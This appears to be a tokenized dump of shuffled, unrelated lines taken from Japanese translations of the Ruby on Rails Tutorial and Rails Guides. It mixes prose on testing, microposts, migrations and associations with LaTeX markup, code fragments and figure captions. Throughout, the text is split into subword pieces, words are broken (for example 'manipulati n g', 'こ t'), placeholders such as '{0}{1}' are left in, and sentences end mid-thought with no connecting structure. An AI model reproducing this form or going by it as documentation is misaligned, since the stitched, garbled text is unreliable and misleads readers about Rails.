▁ アプリケーションの コード よりも 明 ら か に テストコード の方が 短 く シ ン プ ル になる ▁( = 簡単に 書 け る ) ▁ のであれば 、 テストを 先に 書 け るように なる ことを 目 指 す 。
▁変更の結果 を リスト \ ref { code : delete _ destroy _ test } に示します 。
▁ここで 、 単 に 既存の テストコード を修正する だけ ではなく 、 新しい テストコード を追加した 理由 について 考え てみてください
▁User モデル のテスト のために いくつかの マイクロポストを 作成 しておく必要があります ので 、 この時点で マイクロポスト を生成する ファクトリー を作成 しておきましょう 。
▁ n >╼ \ end { enumerate } ╼╼% ▁subsection ▁profile _ micropost _ tests ▁( end )╼╼ ▁% ▁section ▁ showing _ microposts ▁( end )╼╼ ▁\ section { マイクロポストを 操作 する } ▁% ▁( fold )╼ ▁\ label { sec : manipulati n g _ microposts }╼╼
▁この 関連付けを 図 で 表 した もの が {0}{1} 図 2▖1 5 {/1}{/0} です 。
▁図 \ ref { fig : demo _ destroy _ user } の ▁[ Destroy ] ▁ リンクをクリックすると ユーザーが 削除され 、 index ページの ユーザーは 1 人 だけ になります
▁ コントローラと ルーティング を定義し たので 、 今度は 新しい セッション で使用する ビュー 、 つまり ログインフォーム を 整 え ましょう 。
▁HTML 構造 を削除し た About ページ
▁第 \ ref { cha : beginning } ▁ 章 や 第 \ ref { cha : a _ toy _ app } 章 , ▁I ▁suggest ▁following ▁the ▁“ hello , ▁world ! ”
▁ テストの 結果を 図 \ ref { fig : sample _ app _ universal } に示します 。
▁ ユーザーを 希 望 の ページに 転 送 するには 、 リクエスト 時点 の ページを どこか に保存 しておき 、 その 場所に リダイレクト させる 必要があります 。
▁なお 、 送信 に 失敗した ときに \ k ode { new } アクション が 再 描画 される は ず なので 、\ k ode { assert \_ template } を使った テスト も含め ている ことに注意してください 。
▁この サイトに ログイン するには 、 <%= ▁@ url ▁%> をクリックして ください 。
▁ここで 、\ k ode { get } も \ k ode { patch } も 次のように
▁ メールアドレスを ユーザー名 にした ことで 、 理 屈 の 上で は 将来 ユーザー 同士 で 通 信 できるように 拡張 できる 可能性 が 開 か れ ます 。
▁\ k ode { provide } 関数 は content \_ for の 代 替 です 。
▁\ href { http :// guides ▖ rubyonrails ▖ org / active _ record _ query ing ▖ html } { where } メソッド や 他の 関連する メソッド の詳細については 、 Rails ガイド の \ k ode { Active ▁Record ▁ クエリ インターフェイス } を 読んで ください 。
▁ 本書 では 、\ k ode { co } エイリアス を設定し ていない システム でも 動作する ように フル ス ペ ル の \ k ode { checkout } を使用しています が 、 著者 自身 は 実際の 開発 で はほとんど い つ も \ k ode { git ▁co } を使って プロジェクト を チェック ア ウ ト しています 。
▁' X - Content - Type - Options ' ▁=> ▁' no sniff '
▁次に 、 Microposts コントローラの \ k ode { destroy } アクション を定義し ましょう ▟ これも 、 ユーザー における 実装 ▁( リスト \ ref { code : admin _ destroy _ before _ filter }) ▁ と だいたい お な じ で s
▁Users リソース の場合と同様 に 、 結合テスト を使用します 。
▁* ▁` nil ` と ` false `
▁ これが うまく い く のは 、\ k ode { change } メソッドは \ k ode { drop \_ table } が \ k ode { create \_ table } の 逆 であること を 知 っている からです ▟ つまり 、 ロールバック 用の 逆 方 向 マイグレーション を簡単に 導 く ことができる のです 。
▁validates ▁: content , ▁length : ▁ {
▁We ’ ll ▁set ▁about ▁changing ▁this ▁in ▁Chapter ▁\ ref { cha : filling _ in _ the _ layout } ▖
▁`: through ` または `: as ` オプション と 組み合わせ た場合 は 無効 です 。
▁# ▁I gnore ▁the ▁default ▁SQLite ▁database ▖
▁{0} 図 7 ▖4{/0}{1} / users /1 にアクセス した 時の エラー ページ ▟\ href { http :// railstutorial ▖ org / images / figures / profile _ routing _ error - full ▖ png }{( 拡大 ) }{/1}
▁default ▁to : ▁ Proc ▖ new ▁ { ▁ Admin ▖ pluck (: email ) ▁ },
▁* ▁` create _ with `
▁` config ▖ action _ view ` にも わ す か ながら 設定 があります 。
▁@ person ▁= ▁person
▁$ ▁rails ▁g
▁上の ディレクトリに 移動
▁{0} 図 5 ▖9{/0} {1} \ href { http :// localhost :3000/ signup }{/ signup } で表示される 新しい サインアップ ページ ▁ ▟\ href { http :// railstutorial ▖ org / images / figures / new _ signup _ page _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁しかし もっと 重要な 理由は 、 ユーザーを 永 続 化 する コードの 中 心 部分 が 、 実は まだ まったく テスト されていない からです 。
▁この場合 、 範囲 オブジェクトの \ k ode { each } メソッドは 、\ k ode { i } という 1 つの ローカル変数 を使用して ブロック を 操作 できます ▟ そして 、 範囲 に含まれる それぞれの 値を この 変数 に 次 々 に 代入 して ブロック を実行します 。
▁* ▁` after _ initialize `: ▁これは 、 アプリケーションの 初期化 が 終わり 、 かつ ` config / initializers ` 以下の イニシャライザ が 実行 された 後に 実行されます 。
▁リスト \ ref { code : f _ error _ messages } で実装した エラーメッセージ に対するテスト を書いて み てください 。
▁# ▁gem ▁' child process ', ▁' 0 ▖ 3 ▖ 6 '
▁Ruby ▁JavaScript ▁( R JS ) ▁ を使って フォロー の関係 性 を削除する
▁ 著者
▁このメソッドは 、 POST リクエストを送信し た 結果を 見 て 、 指定された リダイレクト 先に 移動 する メソッドです ▟ したがって 、 この 行 の 直後 では \ k ode { ’ users / show ’} テンプレート が表示されている はずです 。
▁in ▁the ▁previous ▁exercise ▁would ▁catch ▁it ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 9 06 99 b ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁following _ tests ▁( end )╼╼ ▁% ▁section ▁a _ web _ interface _ for _ following _ and _ followers ▁( end )╼╼ ▁\ section { ステータスフィード } ▁% ▁( fold )╼ ▁\ label { sec : the _ status _ feed }╼╼
▁Rails ▁ アップグレード ガイド
▁ メイラー 呼び出し は非常に 簡単です 。
▁ プラグイン ジェネレータ で 利用できる オプション の 一覧 をすべて 表示する には 、 以下 を 入力 します 。
▁ ホ ーム ディレクトリに 移動
▁ここでは 、\ ref { sec : modeling _ demo _ users } で説明した ユーザー用の データモデル を 、 その モデル を表示する ための Web インターフェイス に従って 実装します 。
▁config ▖ action _ mailer ▖ default _ url _ options ▁= ▁ { ▁host : ▁' example ▖ com ' ▁ }
▁Rails では 、 このような ハッシュの ハッシュ ▁( または \ emph { ネスト された ハッシュ }) ▁ が 大 量 に 使われ ています ▟ 実際の 使用 例 は \ ref { sec : signup _ failure } で説明します 。
▁### ▁ エンジンの 設定
▁ /* ▁ typography ▁* /
▁add _ index ▁: public ation s , ▁: public ation _ type _ id
▁` collection ` メソッドは 、 関連付けられた すべての オブジェクト の配列 を返します 。
▁ クラス 内で \ k ode { private } キーワード より 下 に記述 した メソッドは 自動的に 非 公開 となります ▟ この ことは コンソール セッション で すぐ 確かめ られます 。
▁WARNING : ▁ モデル名 の 並び順 は ` String ` クラスの ` < ` 演算子 を使用して 計算 されます 。
▁* ▁` created _ at ` ▁- ▁ レコードが 作成された 時に 現在の 日付 時刻 が自動的に 設定 されます
▁-
▁" "▖ demodulize ▁# ▁=> ▁" "
▁また 、 テストは アプリケーションの コード に対して \ emph { クライアント } として 振 る 舞 う ので 、 ソフトウェア 設計 の 改良 に つ な が ること も 多 くなる でしょう 。
▁* ▁` active _ record ▖ set _ dispatch _ hook s `: ▁` config ▖ cache _ classes ` が ` false ` に設定され ている 場合 、 再 読み込み 可能な データベース接続 をすべて リ セット します 。
▁デフォルトは ` " localhost " ` であり 、 必要に応じて 変更 する ▟ </ li >
▁この ページ を作成し たら 、 第 \ ref { cha : following _ users } 章 の サンプル ・ アプリケーション で使用する 予定です 。
▁この データモデル を実装する ために 、 まずは 次のように 図 \ ref { fig : relationship _ model } に 対応 した マイグレーション を生成します 。
▁これらの アプリ を 既に Bitbucket の リポジトリ に プッシュ して ある なら 、 それ を利用して い つ でも アプリ を 復 元 できます ▁( その 必要 があれば ですが ) 。
▁ 以下のコード の場合 、
▁Having
▁この ディレクトリ に置かれ た ファイルは Sprockets ミドルウェア によって サポート されます 。
▁ 要 する に 、\ k ode { name } と \ k ode { email } に あらゆる 文字列を 許 す のは 避ける べ き です ▟ これらの 属性 値 には 、 何らかの 制 約 を与える 必要があります 。
▁このコードは リスト \ ref { code : generalized _ current _ user } で使用されていました ▟ もうひとつ 、
▁この サンプル アプリ は 生 まれ た て なので 、 今 の ところ リファクタリング の 必要な 箇所 は ほぼ ど こ にも 見 当 たり ません ▟ しかし 「 一 匹 い れば 30 匹 い ると 思 え 」 、\ href { https :// en ▖ w ikipedia ▖ org / wiki / Code _ s me ll } { コードの 腐 敗 臭 } は どんな 小さな 隙 間 から も 忍 び 寄 って きます ▟ こ m リファクタリング の 習慣 を できる だけ 早い うちに 身につけ るために も 、 少々 無 理 や り に \ ref { sec : layouts _ and _ embedded _ ruby } から 始 め る ことにします 。
▁これらの オプションを 関連付けの 宣言 に追加する ことで 、 関連付け コールバック を 定義 できます 。
▁* ▁1 つの 記事 は 複数の コメント を 持 て る ▁( O ne ▁article ▁can ▁have ▁many ▁comments ) 。
▁ 本番環境で クラウド スト レ ー ジ に保存 するためには 、 リスト { p 0} のように {2} fo g {/2} ▁gem を使うと 簡単です 。
▁ 厳 密 には これは 正しい 表現 ではありません ▟ という の も 、 scaffold のコード には 初 歩 的な テストが 一 応 含 まれ ている からです ▟ ただ 、 scaffold のテスト コードは 読み づ ら く 、 柔 軟 性 も ありません ▟ さらに データ の検証 、 ユーザー 認 証 、 その 他 に必要な 独自 テスト も 含 まれ て いません 。
▁belongs _ to ▁: magazine
▁class ▁C ; ▁end
▁` acts _ like ?` メソッドは 、 一部の クラス が その他の クラス と同様に 振 る 舞 う かどうか の チェック を 、 ある 慣例 に 則 って 実行 します ▟ ` String ` クラス と同じ インターフェイス を 提供する クラス があり 、 その中で 以下の メソッドを 定義 しておく とします 。
▁\ emph { 注 } : ▁ 『 \ emph { 演習 の 解 答 マニュアル } ▁( 英語 ) 』 には \ emph { Ruby ▁on ▁Rails チュートリアル } の すべての 演習 の 解 答 が 掲 載 されており 、\ href { http :// www ▖ railstutorial ▖ org /}{ www ▖ railstutorial ▖ org } で 原 著 を 購 入 い ただ いた 方 には 無料 で 配 布 しています ▁( 訳 注 : ▁ 解 答 は 英語 です ) 。
▁ このため 、 と に か く Web アプリケーションを 書 け る ようになり たい 方は 、 最初に Rails を 学 び 、 次に Ruby を 学 んで から 再び Rails に 戻 って く る ことをお勧めします 。
▁ マイクロポストの 画像 表示 画面 を追加する
▁ バグ レポート は 、 と に か く 簡潔 で わかりやすく 、 そして なるべく 簡単に 現 象 を再 現 できるように 書 い てください ▟ バグ を修正する 開発者 にとって 何 より ありがたい のは 、 このような 「 よい バグ レポート 」 です ▟ たとえ バグ レポート を作成する あなた が 最終的に コードを 書 か なくても 、 よい バグ レポート は 大きな 貢献 となります 。
▁### ▁ アプリケーション が提供する クラス を使用する
▁ 従来 の ジョブ が 以下のような もの だった とします 。
▁# ▁▖▖▖
▁ 技術 書 を 飛 ば し 読み する のが 習慣 になっている 方 にとって は 少々 頭 の 切り 替 え が必要になる かもしれませんが 、 それ だけ の値 打 ち は 十分 に あります ▟ ぜ ひ ト ラ イ してみてください 。
▁first : ▁1
▁ 現時点の テストでは 、 ユーザーは ひ と り い れば 十分です ▟ そのユーザー には 有効な 名前 と 有効なメールアドレス を設定し ておきます 。
▁Client ▖ pluck (: name )
▁ 手 始 め に 、 画面 に 何か テキスト を表示し てみましょう 。
▁* ▁` javascripts ` は 、 生成 時に JavaScript ファイル への フック をオンに する かどうかを指定します 。
▁この ルーティング はまだ 存在してい ません ので 、` config / routes ▖ rb ` の ` resources ▁: articles ` 行 を以下のように変更し ます 。
▁now ▁= ▁ DateTime ▖ current ▁# ▁=> ▁Mon , ▁ 07 ▁Jun ▁2010 ▁20 : 2 6 : 36 ▁+0000
▁ こ の中で 、 記憶トークン を 空欄 のまま に して いることにご注目ください ▟ 記憶トークン が 使用される 前に エラー が発生する ので 、 記憶トークン の値 は 何 でも 構 わ ないので す 。
▁#### ▁ アプリケーション が提供する モデル を使用する
▁上 は フォームから送信 された メールアドレス であり 、
▁( Code ▁School の \ href { http :// mb sy ▖ co / 6 V Q 8 l } { RSpec コース } の 履 修 を 検 討 してみる の も よいでしょう ▟ この コース は RSpec に関する 多くの 疑 問 に 答 え てくれる という 読者 からの 報 告 もあります ) 。
▁このコードは 、 値が \ k ode { nil } で なければ \ k ode { session [: forwarding _ url ]} を 評価 し 、 nil であれば 与えられた デフォルトの URL を使用します
▁この ` published ` スコープ を呼び出す には 、 クラス で この スコープ を呼び出します 。
▁ここでは 、 Twitter のような 独立した マイクロポストの \ k ode { index } ページ は 作 らず に 、 図 \ ref { fig : user _ microposts _ mockup } のモックアップ に示したように 、 ユーザーの \ k ode { show } ページ で 直接 マイクロポストを 表示 させる ことにします 。
▁class ▁M an if est ▁< ▁ActiveRecord :: Base
▁ デプロイ の 下 準備 として 、 まずは この 時点 まで の 変更を \ k ode { master } ブランチにマージ しておいてください 。
▁上のコード で 、 require の パス にある \ k ode { ’ ▖ ’} は 、 Unix の ▁“ カレント ディレクトリ ” ▁( 現在の ディレクトリ ) ▁ を表し 、\ k ode { ’ ▖ / example _ user ’} という パス は 、 カレント ディレクトリ からの 相 対 パス で example _ user ファイルを 探 す ように Ruby に 指示 します 。
▁ 初めて 書く テストが い き なり 「 テスト 先 行 」 という のは 、 Ruby ▁on ▁Rails の 知識 が ある程度 以上 必要な ため 、 少々 敷居 が 高い 面 もあります 。
▁* ▁ ファイル名
▁上の 論理値 に基いて ユーザーを 認 証 するには 、 ユーザーを 認 証 してから \ k ode { activated \_ at } タイムスタンプ を更新する 必要があります ▟ ( update _ attributes ではなく update _ attribute を実行し ていることに注目してください ▟ update _ attributes だと バリデーション が 実行 されてしまう ため 、 今回の ように パスワードを 入力 していない 状態 で 更新 すると 、 バリデーション で 失敗 してしまいます ▟)
▁図 \ ref { fig : micropost _ content _ can t _ be _ blank } と同じ 表示 になる こ t 確認してください 。
▁As ▁long ▁as ▁you ▁re tain ▁this ▁notice ▁you
▁StaticPages コントローラの タイトル をテストする
▁User ▁add ▁some ▁examples ▁to ▁( or ▁delete )
▁上のコードは ▁"/ test " ▁ から データ を取得し 、 結果を Web ページ 上の ` re s ul t s ` という id を持つ ` div ` タグ に 押 し 込 みます 。
▁ 主な 理由は 、 デフォルトの Rails ページ は Heroku で 破 損 してしまう ことが 多く 、 そのまま だと デプロイ が成功した のか 失敗した のか が わかりにくい ためです 。
▁今度は 以下の テストスイート は 成功 するはずです 。
▁ これらは 以下のように デフォルト として 指定 することができます 。
▁` app / helpers / blorgh / articles _ helper ▖ rb ` の ヘルパー も同様に 名前空間化され ます 。
▁次の バージョン から は 、 これらの エラー は 抑 制 され なくなります のでご注意ください 。
▁* ▁` eager _ load `
▁ アカウント を 有効化 した ばかり のユーザー は プロフィール画面 にリダイレクトされる ので 、 その プロフィール画面 が正しく 描画 されている ことは 、 単 体 テスト を通して 確 認 済み です ▁( リスト \ ref { code : signup _ with _ account _ activation _ test }) 。
▁ そのため 、 まずは 重複 した メールアドレス から テスト していきます ▁( リスト \ ref { code : validates _ uniqueness _ of _ email _ test }) 。
▁ 以下 を ` Gemfile ` に追加する 必要があります 。
▁ パスワード と パスワード の 確 認 をテストする 。
▁ テストが ▁\ passing ▁ になった ので 、 安 心 して コードを リファクタリング できるようになりました 。
▁ テスト駆動開発 が行われていない
▁person ▁= ▁Person ▖ new ( name : ▁" A nd re a ", ▁email : ▁" and re a @ example ▖ com ")
▁続いて 、 Turbolinks は P us h State を使用して URL を 正しい もの に 書き 換 え 、 リ フ レ ッ シ ュ の セ マ ン テ ィ ク ス を 維 持 しながら プ リ テ ィ URL を与え ます 。
▁( サイト ロゴ が ページ で 一度 しか 使用 されない ことを 前提と して CSS ▁id を使用しています が 、 代わりに クラス を使用することもできます ) 。
▁NOTE : ▁ ユーザーが 定義 した Rake タスク はデフォルトで development 環境で 動作する ようになります 。
▁ } ╼ %= ▁<< ( chapter s / gemfile s / sample _ app / Gemfile , ▁ lang : ▁ ruby )╼\ end { code listing }╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : user _ microposts _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁上の ` collection ▖ create ` と同じ ですが 、 レコードが invalid の 場合に ` ActiveRecord :: RecordInvalid ` が raise される 点 が異なります 。
▁ サインイン の 失敗 を 正しく テスト する コード 。
▁これにより 、 以下 を使用して 有効化トークン にアクセス し 、
▁Action ▁View の テンプレート は さまざまな 方法で 記 述 することができます 。
▁ Calvin は 2 番目の ユーザー Thomas ▁ Hobbes ▁( 図 \ ref { fig : page _ flow _ other _ profile _ follow _ button }) ▁ を表示し 、[ Follow ] ▁ ボタン を 押 して フォロー します 。
▁### ▁` root ` を使用する
▁### ▁Rails の HTML サ ニ タ イ ザ
▁NOTE : ▁ マイグレーション はデフォルトで は development ▁( 開発 ) ▁ 環境で 実行されます ▟ そのため 、` config / database ▖ yml ` ファイルの ` development ` セクション で 定義されている 開発 用 データベース に対して 実行される 点にご注意ください 。
▁d =' ex - b 87 c 8 2 ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁users _ controller ▁( end )╼╼ ▁\ subsection { ユーザー登録 用 URL } ▁% ▁( fold )╼ ▁\ label { sec : signup _ url }╼╼
▁ 表示される ログインフォーム を 図 \ ref { fig : login _ form _ remember _ me } に示します 。
▁このとき 、 リスト { p 0} のように フォーム 変数 {2} f {/2} を明示的に ローカル変数 として 渡す 必要がある ことに注意してください ▟ また 、 provide 関数 を使うと 、 パーシャル 化 した new フォーム や edit フォームの 重複 を さらに 取り除く ことも 可能です ▁( J o se ▁C ar lo s ▁Mon ter o ▁G ó me z の 指 摘 に 感 謝 します ) 。
▁{0} 図 7 ▖ 7 {/0} ▁{1} ユーザー表示ページ に Gravatar のデフォルト 画像 が表示されている {/1}
▁# ▁ 元 と 異なる 新しい インスタンス である
▁params ▖ require (: article )▖ permit (: title , ▁: text )
▁このコードは たとえば ▁\ k ode {" 0 ▁errors " }、\ k ode {" 1 ▁error " }、\ k ode {" 2 ▁errors "} ▁ など のように 、 エラー の 数 に応じて 活用 された 単語 を返します ▟ これにより 、\ k ode {" 1 ▁errors "} ▁ のような 英語 の 文法 に 合 わ ない 文字列を 避ける ことができます ▁( これは Web 上で どう し よう も ない ほど よく 見 かけ る エラー です ) 。
▁$ ▁git ▁re base ▁rails / master
▁ 認可 に対するテスト では 、 特定の HTTP リクエスト を直接 送信する 低 級 な テスト と 、 ブラウザの 操作を シ ミ ュ レ ー ション する 高 級 な テスト ▁( 統合テスト ) ▁ の 2 つ を 利用 した
▁WARNING : ▁ 削除 の され 方は これ だけ ではありません ▟ オブジェクト 同士 が ` dependent : ▁: destroy ` で 関連付けられている 場合は destroy されます が 、 オブジェクト 同士 が ` dependent : ▁: delete _ all ` で 関連付けられている 場合は delete されます のでご注意ください 。
▁NOTE : ▁` where ` が このように 動作する のは 、 ハッシュ を 渡 した 場合 だけです 。
▁ 名前空間 が 導 入 されている ことで コードの 衝 突 は 回 避 されます が 、 エンジンの コントローラ から メ イン アプリケーションの ` Application Controller ` の メソッド にアクセス する 必要 も 頻繁に 発生 します 。
▁ Railtie s
▁e ' ▁id =' ex - 9 8 f cd 3 ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁named _ routes ▁( end )╼╼ \ subsection { リンク のテスト } ▁% ▁( fold )╼\ label { sec : layout _ link _ tests }╼╼
▁$ ▁git ▁branch ▁-- track ▁4 - 0 - s table ▁ origin / 4 - 0 - s table
▁Active ▁Job ▁ の基礎
▁つまり 、` assert _ generate s ` と ` assert _ recognizes ` の 機能を 組み合わせ た もの になります 。
▁ リダイレクト に ブロック を 渡す こともできます ▟ この リダイレクト は 、 シンボル 化 された パス パラメータ と request オブジェクト を受け取り ます 。
▁ Order ▖ group (: status )▖ count
▁I ▁shall ▁be ▁late !" ▖ truncate ( 20 )
▁Sprockets では 、` index ` という名前の ファイル ▁( および 関連する 拡張子 ) ▁ を 特殊な 目的 に 使用します 。
▁リスト \ ref { code : remember _ me _ ternary } の実装 によって 、 ログイン システム の実装 が ついに 完了 しました ▟ ブラウザで この チェックボックス を 実際に オン に したり オフ に したり して 、 動作を 確認し てみましょう 。
▁図 \ ref { fig : user _ index _ all } が 示す ように 、 ▁最初の いくつかの メールアドレス については 、 デフォルトの Gravatar 画像 以外の 写 真 を 関連付け て み ました 。
▁\ href { https :// console ▖ a w s ▖ a mazon ▖ com / s 3 } { A W S ▁C on so le } から S 3 ▁b u cket を作成し ▁( b u cket の名前 は な んで も 大丈夫 です ) 、 2▖ で作成した ユーザー に対して Re ad 権限 と Write 権限 を 付 与 する
▁ したがって 、 管理者 や 一 般 ユーザーの テスト 、 そして ページネーション や 削除リンク のテスト をすべて まとめると 、 リスト \ ref { code : delete _ link _ integration _ test } のようになります 。
▁is ▁a ▁project ▁to ▁make ▁a ▁book ▁and ▁ screencasts ▁to ▁teach ▁web ▁development
▁ 述 語 ` anonymous ?` を使用して 、 モジュール に 名前 があるかどうかをチェック できます 。
▁ 以下のような 、 より 一般的な 記 法 を使用することもできます 。
▁ ページ の内容は 図 \ ref { fig : hello _ world _ hello _ app } と まったく 同じです が 、 今 や それが イン ター ネ ッ ト 上の 本番 Web ページ として 堂 々 と 公開 されている のです 。
▁def ▁create
▁< h 1> New ▁ zone </ h 1>
▁ / / ▁▖▖▖
▁We ▁first ▁invoke ▁the ▁console ▁with ▁\ k ode { rails ▁console } ▁at ▁the ▁command ▁line , ▁and ▁then ▁retrieve ▁the ▁first ▁user ▁from ▁the ▁database ▁using ▁\ k ode { User ▖ first } ▁( putting ▁the ▁results ▁in ▁the ▁variable ▁\ k ode { first \_ user })
▁It em ▁Load ▁( 0 ▖ 3 m s ) ▁ SELECT ▁* ▁FROM ▁` items ` ▁LIMIT ▁1 ▁F O R ▁ UPDATE
▁図 \ ref { fig : invalid _ email _ password _ reset } に示すように 、 この時点で の アプリケーションは 、 無効な メールアドレスを 入力 した 場合に 正常に動作し ます 。
▁c p ▁< コピー 元 > ▁< コピー 先 >
▁ どの ヘルパー も 任意の 数 の 属性を 受け付け る ことができる ので 、1 行 の コードを書く だけで 多くの 属性 に対して 同じ バリデーション を 実行 できます 。
▁ ╼ ▁This ▁is ▁the ▁sample ▁application ▁for ▁the ▁tutorial ▖
▁リスト \ ref { code : hello _ root _ route } のルーティング を 編集 して 、 ルート ルーティング の 割り当て 先 を \ k ode { hello } アクション から \ k ode { goodbye } アクションに 変更します ▁( 図 \ ref { fig : goodbye _ world }) 。
▁NOTE : ▁` sass - rails ` ▁gem が Gemfile に 含 まれ ていれば 自動的に CSS 圧縮 に 使用されます ▟ この場合 ` config ▖ assets ▖ css _ compressor ` オプションは 設定 されません 。
▁Rails ▁ アプリケーション を設定する
▁ 必要であれば 、` config / database ▖ yml ` の 内部で URL を直接 指定することもできます 。
▁@ article ▁= ▁Article ▖ new
▁ ブロック を 後ろに 伴 う メソッドは すべて 、 ブロック の中に ネストした マークアップ を含む XML マークアップ タグ として 扱 われます 。
▁ 読者 の P a ul o ▁C é li o ▁ J ú n i or からの ご 指 摘 でした ▟ あり が と う ご ざ いました 。
▁> > ▁10 ▖ weeks ▖ ago
▁以上で GitHub 上の プルリクエスト を 更新 できるように なり 、 実際に 更新 された ことを確認 できます 。
▁ これはリスト \ ref { code : title _ test } で使用されていました 。
▁ いずれ か の メイラー に ` receive ` メソッド を定義する と 、 受 信 した 生の メール は Action ▁Mailer によって 解 析 され 、 email オブジェクト に変換 されて デ コード された 後 、 メイラー が 新たに インスタンス化され 、 その メイラー の ` receive ` インスタンス メソッド に渡され ます 。
▁ これまで クラス や 継 承 について 説明 して きました が 、 これらの 話 は 前の 章 にも あった ような 気 が します ▟ { それ も その は ず で 、 StaticPages コントローラで 継 承 や クラス について 触れ た こと があり ました ▁({0}{1} リスト 3▖1 8 {/1}{/0} ) 。
▁` params ` メソッドは ` ActiveSupport :: Hash With I ndifferentAccess ` オブジェクトを返します ▟ 文字列 または シンボル を使用して 、 この オブジェクトの ハッシュの キー を指定できます 。
▁ユーザーの \ k ode { update } アクション の 初期 実装
▁ 「 forgot ▁password 」 フォーム
▁2 つ目の ` Person ` は データベースに保存 されません 。
▁\ k ode { about } アクション が追加された StaticPages コントローラ ▁ RE D {3} { 4 } {/4} { 4 } { 5 } { /5}{/ 4 } { 4 } {/4} {/3}
▁` ActiveRecord :: Base ▖ primary _ key = ` メソッドを使用して 、 テーブルの 主キー として 使用される カラム名 も オーバーライド できます 。
▁* ▁` lib / blorgh / engine ▖ rb ` での 名前空間 分 離
▁` collection ▖ clear ` メソッドは 、 結合テーブル 上の レコード を削除し 、 それによって すべての オブジェクトを コレクション から 削除します 。
▁この 値は [ 環境変数 ]( http :// ja ▖ w ikipedia ▖ org / wiki / % E 7 % 92 % B 0 % E 5 % A 2 % 8 3 % E 5 % A 4 % 89 % E 6 % 9 5 % B 0 ) で 設定 することもできます ▟ これ を使用すると 、 ステージング サーバー ▁( 訳 注 : ▁ 検証 用に 本番 サーバー を 複 製 した サーバー ) ▁ の実行 が 楽 になります 。
▁* ▁: condition s
▁def ▁validate ( record )
▁See ▁more
▁{0} 図 6 ▖5{/0}{1} User モデルに \ k ode { password _ digest } 属性 を追加する ▟ {/1}
▁たとえば 、\ k ode { flash [: success ] ▁= ▁" Welcome ▁to ▁the ▁ Sample ▁App !" } と する 場合 、 以下のコード を実行すると
▁ Category ▖ joins (: articles )
▁` ActionView :: Partial s :: Partial Render er ` は 、 デフォルトで テンプレート と同じ 名前を持つ ローカル変数 の中に 自身 の オブジェクト を持ちます 。
▁以下の フィーチャー は 、 エラーメッセージ が表示される は ず である ということ を記述し ています 。
▁C ▖ descendants ▁# ▁=> ▁[ B ]
▁ 関連付け を使用する から には 、 関連付け の設定 に合わせて データベースの スキーマ を 常に 更新 しておく 責 任 が生じ ます 。
▁" B ackoffice :: UsersController "▖ demodulize ▁# ▁=> ▁" UsersController "
▁### ▁ マイグレーション を実行する
▁validates ▁: size , ▁inclusion : ▁ { ▁in : ▁% w ( small ▁m ed i um ▁large ),
▁#### ▁Time オブジェクトの JSON 形式 表現
▁これにより 、 以下のように オブジェクトの 2 つの コピー 同士 で 内容 が 一致し な くなる ことがあります 。
▁config ▖ middleware ▖ delete ▁" ActionDispatch :: Cookie s "
▁ 特に 機能 テスト を作成する 際に は 、 テストが 実行される のは エンジン ではなく ` test / dummy ` に置かれ る ダ ミ ー アプリケーション 上 である という 点 に 留 意 する必要があります 。
▁array ▁= ▁[ ' string ']
▁なお 、 この 削除 用 ルーティング に 通常の ` get ` ルーティング が 使用されている と 、 以下のような 危 険 な URL を 送信 できてしまいます 。
▁ チェックボックス 用の フォーム input タグ を作成します 。
▁ これはリスト \ ref { code : skip _ re size _ initializer } で使用されていました 。
▁def ▁ symbolize _ keys
▁# ▁your ▁examples ▁within ▁a ▁ transaction , ▁remove ▁the ▁following ▁line ▁or
▁To p ic ▖ create ( title : ▁nil )▖ valid ?
▁ ポリモーフィック関連付け を使用すると 、 ある 1 つの モデル が 他の 複数の モデルに 属 している ことを 、1 つの 関連付け だけで 表現 することができます 。
▁{0} 図 2▖1 1 {/0} {1} Rails における MVC ▟\ href { http :// railstutorial ▖ org / images / figures / mvc _ detailed - full ▖ png }{( 拡大 ) }{/1}
▁ より 高度な レベルで のバリデーション エラー については 、[ バリデーション エラー の 取り 扱 い ](# バリデーション エラー に対応する ) セクション を参照してください 。
▁ ブラウザの cookies に保存 する ユーザー ID は 暗号化 しておく 。
▁% r { ▖ } m ▖ multiline ?
▁<%= ▁form _ for ▁: article , ▁url : ▁articles _ path ▁do ▁| f | ▁%>
▁ / Users / mhartl / rails _ projects / sample _ app / config
▁\ emph { Ruby ▁on ▁Rails チュートリアル } では 、 より 実 践 的な 知識 を 身につけ るために 、 Scaffold と ほぼ 逆 の アプローチ で 開発 を 進 め ていきます ▟ 具体的には 、 第 \ ref { cha : a _ toy _ app } ▁ 章で 作成する 簡単な デ モ アプリ では scaffold を使います が 、\ emph { この チュートリアル } の 中 核 である 第 \ ref { cha : static _ pages } 章 以降 の サンプルアプリケーション から は 、 scaffold を 一 切 使 わ ずに 開発 を 進 め ていきます 。
▁ユーザー が作成され 、\ href { http :// localhost :3000/ users /1 }{\ text tt { 図 2▖ 6 } } のように {2} {3} show {/3} {/2} ページ が表示されます
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 4/ classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁{0}{1} 第 2 章 {/1}{/0} で 簡 易 的な マイクロポスト 投 稿 フォーム に 触れ ましたが 、 この章 では 、\ ref { sec : microposts _ resource } で 記 述 した Micropost データモデル を作成し 、 User モデルと \ k ode { has _ many } および \ k ode { belongs _ to } メソッドを使って 関連付けを 行い 、 さらに 、 結果を 処理 し 表示 するために必要な フォーム と その 部品 を作成します ▁(\ ref { sec : micropost _ images } で 画像 の アップロード も 実装します ) 。
▁### ▁ バグ レポート の 確 認
▁テストにパスする まで これを 繰り返し ます 。
▁* ▁ 開発環境
▁Rails ▁ では 、 他の 箇所 で 予 想 外 の エラー が生じ たときに 検出 できる よう 、[ T ra v is ▁C I ]( https :// t ra v is - ci ▖ org / rails / rails ) を使用しています 。
▁ デバッグ モード をオフに するには 、` config / environments / development ▖ rb ` に 以下 を 追 記 します 。
▁{0} 図 5 ▖6{/0}{1} デザイン された ロゴ と サンプル アプリ {/1}
▁#### ▁CSS と ERB
